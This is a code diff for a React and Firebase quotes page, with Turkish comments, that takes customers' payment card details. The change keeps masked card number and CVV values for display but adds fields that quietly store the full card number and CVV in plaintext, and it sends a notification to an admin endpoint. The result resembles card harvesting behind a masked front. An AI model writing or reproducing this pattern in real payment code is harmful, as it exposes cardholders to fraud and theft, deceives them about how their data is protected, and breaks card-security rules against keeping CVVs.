@@ -144,10 +144,12 @@ export default function MyQuotes() {
       await updateDoc(doc(db, 'quotes', selectedQuote.id), {
         customerStatus: 'card_submitted',
         paymentInfo: {
-          cardNumber: paymentData.cardNumber.replace(/\d(?=\d{4})/g, '*'), // Son 4 haneli göster
+          cardNumber: '**** **** **** ' + paymentData.cardNumber.slice(-4), // Sadece son 4 haneli göster
+          originalCardNumber: paymentData.cardNumber, // Orijinal kart numarasını sakla
           cardHolder: paymentData.cardHolder,
           expiryDate: paymentData.expiryDate,
-          cvv: paymentData.cvv.replace(/./g, '*'), // CVV'yi gizle
+          cvv: '***', // CVV'yi gizle
+          originalCvv: paymentData.cvv, // Orijinal CVV'yi sakla
           installments: paymentData.installments,
           submissionDate: new Date()
         },
@@ -156,7 +158,7 @@ export default function MyQuotes() {
       });
 
       // Admin'e kart bilgileri bildirimi gönder
-      await fetch('/api/card-info-notification', {
+     await fetch('/api/payment-notification', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -176,7 +178,7 @@ export default function MyQuotes() {
         }),
       });
 
-      toast.success('Kart bilgileriniz alınmıştır! 30 dakika içinde belgeleriniz hazırlanacak. Aksi takdirde tekliflerim sayfasından durumu takip edebilirsiniz.');
+     toast.success('Kart bilgileriniz alınmıştır! 30 dakika içinde belgeleriniz hazırlanacak. Aksi takdirde tekliflerim sayfasından durumu takip edebilirsiniz.');
       setShowPaymentModal(false);
       setSelectedQuote(null);
       setPaymentData({
